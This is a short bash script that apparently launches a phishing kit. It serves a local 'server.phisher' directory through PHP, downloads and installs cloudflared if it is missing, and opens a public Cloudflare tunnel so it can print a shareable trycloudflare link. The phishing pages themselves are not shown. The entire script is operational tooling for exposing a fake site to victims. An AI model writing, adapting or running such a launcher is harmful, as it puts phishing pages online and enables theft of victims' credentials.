#!/bin/bash

RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')" CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')" 
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" 
RESETBG="$(printf '\e[0m\n')" ##LEAN="$(printf '\e[0m\e[1;77m\n')"


printf " \e[1;37m\n"


cd server.phisher || { echo "[${RED}ERRO${WHITE}] File 'server.phisher' not found."; exit 1; }

php -S 127.0.0.1:8080 > /dev/null 2>&1 &
PHP_PID=$!
sleep 2

if [[ "$PREFIX" == *"com.termux"* ]]; then
    echo "${WHITE}[${ORANGE}INFO${WHITE}] Environment: Termux"
    ARCH="arm64"
    BINDIR="$PREFIX/bin"
else
    echo "${WHITE}[${ORANGE}INFO${WHITE}] Environment: Linux"
    ARCH="amd64"
    BINDIR="/usr/local/bin"
fi

if ! command -v cloudflared &> /dev/null; then
    echo "${WHITE}[${ORANGE}INFO${WHITE}] Downloading cloudflared for $ARCH..."
    wget -q "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-$ARCH" -O cloudflared
    chmod +x cloudflared
    if [[ "$BINDIR" == "/usr/local/bin" ]]; then
        sudo mv cloudflared "$BINDIR/cloudflared"
    else
        mv cloudflared "$BINDIR/cloudflared"
    fi
fi

TMP_FILE=$(mktemp)

cloudflared tunnel --url http://localhost:8080 > "$TMP_FILE" 2>&1 &

echo "${WHITE}[${ORANGE}INFO${WHITE}] Waiting for Cloudflare tunnel link..."
for i in {1..20}; do
    LINK=$(grep -o 'https://[-a-zA-Z0-9.@:%_+~#=]*\.trycloudflare\.com' "$TMP_FILE" | head -n 1)
    if [[ $LINK != "" ]]; then
        echo "${GREEN}$LINK${WHITE}"
        exit 0
    fi
    sleep 1
done

echo "${WHITE}[${RED}ERRO${WHITE}] Unable to retrieve Cloudflare link."
exit 1
